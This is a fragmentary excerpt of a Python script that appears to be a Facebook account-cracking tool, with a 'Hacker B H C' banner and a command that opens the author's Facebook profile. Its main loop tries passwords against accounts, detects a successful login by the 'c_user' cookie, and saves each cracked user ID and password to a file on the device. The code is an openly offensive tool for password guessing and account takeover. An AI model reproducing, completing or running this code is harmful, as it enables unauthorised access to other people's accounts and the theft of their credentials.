...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100094387562950')
logo = ("""
    ____     _____    ______
   / __ )   / ___/   / ____/
  / __  |   \__ \   / /     
...
/_____/   /____/   \____/   
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Hacker B H C   \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Hacker B H C   \033[1;32m║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/BSC-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
